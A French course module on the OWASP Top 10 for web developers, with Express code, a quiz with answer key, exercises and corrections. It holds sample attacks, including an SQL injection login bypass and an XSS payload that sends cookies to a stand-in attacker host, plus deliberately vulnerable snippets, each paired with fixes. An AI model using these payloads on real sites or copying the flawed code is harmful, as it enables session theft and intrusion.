---
slug: g05-1-securite-owasp
titre: Sécurité des applications web, OWASP Top 10
domaine: Sécurité
duree: 120
difficulte: bases
licence:
  - { niveau: L2, semestre: S4, ue: "Réseaux et sécurité" }
parcours:
  - { parcours: devops, ordre: 18 }
  - { parcours: web, ordre: 17 }
ordre: 2
prerequis_cours: []
visibilite: public
objectifs:
  - Présenter l'OWASP et les grandes catégories du Top 10
  - Reconnaître et corriger une injection SQL et une faille XSS
  - Expliquer les erreurs de contrôle d'accès (IDOR) et les corriger côté serveur
  - Stocker correctement les mots de passe (bcrypt, argon2) et gérer les sessions JWT
  - Appliquer les protections de base (en-têtes HTTP, HTTPS, dépendances à jour, secrets)
prerequis:
  - Une API Node/Express ou NestJS (semaines 2 et 3)
  - Les bases de HTTP (voir le cours « Les réseaux pour développeurs, IP, ports, DNS et HTTP »)
referentiels:
  - OWASP Top 10 (édition 2021) et OWASP ASVS 4.0 (Application Security Verification Standard)
  - CompTIA Security+ (SY0-701), domaine 2 « Threats, Vulnerabilities and Mitigations »
  - ANSSI, « Recommandations relatives à l'authentification multifacteur et aux mots de passe »
quiz:
  - question: "Quelle est la protection efficace contre l'injection SQL ?"
    choix: ["Échapper les apostrophes à la main", "Les requêtes paramétrées (placeholders $1, ?)", "Cacher les messages d'erreur", "Utiliser HTTPS"]
    reponse: 1
    explication: "Avec une requête paramétrée, la base reçoit le code SQL et les données séparément : une donnée ne peut jamais devenir du code."
  - question: "Un utilisateur connecté change /api/factures/41 en /api/factures/42 et voit la facture d'un autre. Quelle catégorie ?"
    choix: ["Injection", "Broken Access Control (IDOR)", "XSS", "Mauvaise configuration"]
    reponse: 1
    explication: "La catégorie n° 1 du Top 10 : le serveur doit vérifier que la ressource appartient bien à l'utilisateur, à chaque requête."
  - question: "Comment stocker un mot de passe ?"
    choix: ["En clair", "Chiffré en AES", "Haché avec un algorithme lent et salé (bcrypt, argon2)", "Haché en MD5"]
    reponse: 2
    explication: "Un hachage lent et salé rend les attaques par dictionnaire très coûteuses ; MD5 et SHA-1 se calculent par milliards à la seconde."
  - question: "Qu'est-ce qu'une faille XSS ?"
    choix: ["Un serveur trop lent", "L'injection de JavaScript malveillant dans une page vue par d'autres utilisateurs", "Un mot de passe faible", "Un port ouvert"]
    reponse: 1
    explication: "Le script s'exécute dans le navigateur de la victime, avec ses droits : vol de session, actions à sa place."
  - question: "Pourquoi un JWT ne doit-il pas contenir de données sensibles ?"
    choix: ["Il est chiffré", "Il est seulement signé et encodé en base64 : n'importe qui peut lire son contenu", "Il est trop court", "Il expire trop vite"]
    reponse: 1
    explication: "La signature garantit qu'il n'a pas été modifié, pas qu'il est secret. jwt.io décode n'importe quel jeton."
---

## Pourquoi la sécurité dès maintenant ?

Une application qui fonctionne n'est pas une application **sûre**. Une seule faille peut suffire à divulguer les données de tous les clients, à faire perdre de l'argent ou à exposer à des sanctions (au Sénégal, la loi sur les données personnelles et la CDP ; en Europe, le RGPD).

Corriger une faille en production coûte cher. Mieux vaut l'éviter dès l'écriture du code : c'est le principe du ***shift left*** (déplacer la sécurité vers le début du cycle) et de la démarche **DevSecOps**.

## L'OWASP et son Top 10

L'**OWASP** (*Open Worldwide Application Security Project*) est une fondation à but non lucratif. Son **Top 10** classe les risques les plus critiques des applications web. C'est la référence citée partout : entretiens, audits, cahiers des charges.

| # | Catégorie (édition 2021) | En bref |
|---|---|---|
| A01 | Broken Access Control | accéder à ce qui ne nous appartient pas |
| A02 | Cryptographic Failures | données sensibles mal protégées |
| A03 | Injection | SQL, commandes système, et XSS |
| A04 | Insecure Design | faille dans la conception elle-même |
| A05 | Security Misconfiguration | configuration par défaut, mode debug actif |
| A06 | Vulnerable Components | dépendances obsolètes |
| A07 | Identification and Authentication Failures | mots de passe faibles, sessions mal gérées |
| A08 | Software and Data Integrity Failures | pipeline ou mise à jour non vérifiés |
| A09 | Logging and Monitoring Failures | attaque non détectée |
| A10 | Server-Side Request Forgery (SSRF) | le serveur appelle une URL fournie par l'attaquant |

## A03, l'injection SQL

**Le code vulnérable :**

```js
// NE JAMAIS FAIRE
const sql = `SELECT * FROM utilisateurs WHERE email = '${req.body.email}' AND mot_de_passe = '${req.body.mdp}'`;
```

Si l'attaquant saisit l'e-mail `' OR 1=1 --`, la requête devient :

```sql
SELECT * FROM utilisateurs WHERE email = '' OR 1=1 --' AND mot_de_passe = '...'
```

`1=1` est toujours vrai et `--` met le reste en commentaire : l'attaquant est connecté **sans mot de passe**.

**La correction, avec une requête paramétrée :**

```js
const { rows } = await pool.query('SELECT * FROM utilisateurs WHERE email = $1', [req.body.email]);
```

Le SQL et les données voyagent **séparément** : une donnée ne peut jamais devenir du code. Les ORM (Prisma, TypeORM) paramètrent automatiquement, sauf si tu concatènes toi-même dans une requête « brute ».

## A03, le XSS (Cross-Site Scripting)

Un commentaire contient `<script>fetch('https://pirate.sn/?c=' + document.cookie)</script>`. Si la page l'affiche **sans échappement**, le script s'exécute chez **chaque visiteur**.

- **React échappe par défaut** : `{commentaire}` affiche le texte, il ne l'exécute pas.
- **Le danger** : `dangerouslySetInnerHTML`, `innerHTML`, `v-html`. Si tu dois afficher du HTML, nettoie-le avec DOMPurify.
- **Les défenses en profondeur** : des cookies `HttpOnly` (inaccessibles au JavaScript) et un en-tête **Content-Security-Policy**.

## A01, le contrôle d'accès

**L'IDOR** (*Insecure Direct Object Reference*) :

```js
// VULNÉRABLE : vérifie qu'on est connecté, pas que la facture nous appartient
app.get('/api/factures/:id', auth, async (req, res) => {
  const { rows } = await pool.query('SELECT * FROM factures WHERE id = $1', [req.params.id]);
  res.json(rows[0]);
});

// CORRIGÉ : la condition d'appartenance est dans la requête
app.get('/api/factures/:id', auth, async (req, res) => {
  const { rows } = await pool.query(
    'SELECT * FROM factures WHERE id = $1 AND client_id = $2', [req.params.id, req.utilisateur.id]);
  if (!rows.length) return res.status(404).json({ erreur: 'Introuvable' });
  res.json(rows[0]);
});
```

Les règles :

- **Tout contrôle se fait côté serveur.** Cacher un bouton dans le frontend ne protège rien : l'API reste appelable avec `curl` ou Postman.
- **Refus par défaut** : une route est protégée, sauf exception explicite.
- On renvoie **404** plutôt que 403, pour ne pas confirmer que la ressource existe.

Par exemple, sur une plateforme de cours, un apprenant qui demande un cours privé reçoit une erreur **404**, contrôlée par le serveur.

## A02 et A07, les mots de passe et les sessions

**Le stockage des mots de passe :**

| Méthode | Verdict |
|---|---|
| En clair | jamais |
| Chiffré (AES) | non : quiconque possède la clé lit tout |
| MD5, SHA-1, SHA-256 seul | non : trop rapide, des milliards d'essais par seconde |
| **bcrypt, argon2id, scrypt** | **oui** : lent, avec un sel unique par utilisateur |

```js
const bcrypt = require('bcryptjs');
const empreinte = await bcrypt.hash(motDePasse, 12);          // 12 = facteur de coût
const ok = await bcrypt.compare(motDePasseSaisi, empreinte);
```

Exemple chiffré : avec un facteur de coût de 12, il y a 2¹² = 4 096 itérations, soit environ 250 ms par essai. C'est imperceptible pour l'utilisateur, mais tester 1 million de mots de passe prendrait environ 70 heures **par compte**, contre une fraction de seconde en SHA-256.

**Les JWT** :

- Un JWT est **signé**, mais **pas chiffré** : `jwt.io` affiche son contenu. Ne mets jamais de données sensibles dedans.
- Utilise un **secret long** (au moins 32 octets aléatoires), une **expiration** courte et l'algorithme imposé côté serveur.
- Pour un navigateur, un cookie `HttpOnly; Secure; SameSite=Lax` est plus sûr que `localStorage` face au XSS.

**Les autres mesures** : limiter les tentatives de connexion (*rate limiting*), proposer l'authentification multifacteur, et afficher un message d'erreur générique (« identifiants incorrects »), qui ne dit pas si c'est l'e-mail ou le mot de passe qui est faux.

## A05, A06, A09 : configuration, dépendances, journalisation

```js
const helmet = require('helmet');
app.use(helmet());                 // en-têtes de sécurité : CSP, X-Content-Type-Options, HSTS…
app.disable('x-powered-by');
```

- **HTTPS partout**, et jamais de détail technique ni de trace de pile dans les erreurs renvoyées en production.
- **Les dépendances** : `npm audit`, Dependabot sur GitHub, ou `trivy fs .`, à intégrer en CI (voir le cours « Intégration continue avec GitHub Actions, premier workflow »).
- **Les secrets** : dans des variables d'environnement, jamais dans Git. On ajoute `gitleaks` en CI.
- **La journalisation** : on enregistre les connexions, les échecs et les refus d'accès (sans les mots de passe), puis on alerte (voir le cours « Supervision avec Prometheus et Grafana »).

## Démonstration

Sur une petite API volontairement vulnérable, construite pour l'atelier :

1. On se connecte sans mot de passe grâce à `' OR 1=1 --`, puis on corrige avec une requête paramétrée.
2. On publie un commentaire contenant `<img src=x onerror=alert(1)>` affiché par `innerHTML`, puis on corrige.
3. On lit la facture d'un autre utilisateur en changeant l'identifiant, puis on corrige.
4. On décode un JWT sur jwt.io pour montrer qu'il est lisible.
5. On lance `npm audit` et `npx helmet`, et on observe les en-têtes avec `curl -I`.

On ne teste **que** sur ses propres applications, ou sur des plateformes prévues pour cela. Attaquer un système sans autorisation est **illégal**.

## Exercice guidé

Pour chaque extrait, nomme la catégorie OWASP et propose une correction :

1. `db.query("DELETE FROM produits WHERE id = " + req.params.id)`
2. `div.innerHTML = "Bienvenue " + new URLSearchParams(location.search).get("nom")`
3. `app.delete('/api/utilisateurs/:id', auth, supprimer)`, où n'importe quel utilisateur connecté peut supprimer n'importe quel compte.
4. `const hash = crypto.createHash('md5').update(mdp).digest('hex')`
5. `res.status(500).json({ erreur: err.stack })`

## Exercice autonome

Audite ton API (celle de la boutique, ou un projet personnel) avec la liste suivante, et corrige ce qui manque :

- [ ] toutes les requêtes SQL sont paramétrées ;
- [ ] chaque route qui renvoie ou modifie une ressource vérifie son appartenance ;
- [ ] les mots de passe sont hachés en bcrypt ou argon2 ;
- [ ] le secret JWT vient de l'environnement, fait au moins 32 caractères et le jeton expire ;
- [ ] `helmet` est actif, et aucune trace de pile n'est renvoyée en production ;
- [ ] `npm audit` ne signale aucune vulnérabilité haute ou critique ;
- [ ] la connexion est limitée à 5 tentatives par minute ;
- [ ] aucun secret dans Git (vérifié avec `gitleaks detect`).

Ensuite, entraîne-toi sur **OWASP Juice Shop** : `docker run -p 3000:3000 bkimminich/juice-shop`. Trouve au moins 3 défis de niveau 1.

## Correction

Exercice guidé :

1. **A03 Injection.** Correction : `db.query('DELETE FROM produits WHERE id = $1', [req.params.id])`, plus une vérification du rôle administrateur (A01).
2. **A03 XSS** (de type DOM). Correction : `div.textContent = "Bienvenue " + nom`.
3. **A01 Contrôle d'accès.** Correction : n'autoriser que l'administrateur, ou `req.params.id === req.utilisateur.id`.
4. **A02 Défaillance cryptographique.** Correction : `await bcrypt.hash(mdp, 12)`.
5. **A05 Mauvaise configuration.** Le détail de l'erreur aide l'attaquant. Correction : journaliser `err` côté serveur et renvoyer `{ erreur: 'Erreur interne' }`.

Exercice autonome : pour limiter les tentatives de connexion, on utilise `express-rate-limit`.

```js
const rateLimit = require('express-rate-limit');
app.use('/api/auth/connexion', rateLimit({ windowMs: 60_000, limit: 5 }));
```

## Pour aller plus loin

- L'OWASP Cheat Sheet Series donne une fiche pratique par sujet : authentification, CSRF, téléversement de fichiers, etc.
- Le programme CompTIA Security+ est une bonne base pour un DevOps qui veut se spécialiser en sécurité.
- Les outils SAST (Semgrep, CodeQL) analysent automatiquement le code en CI.
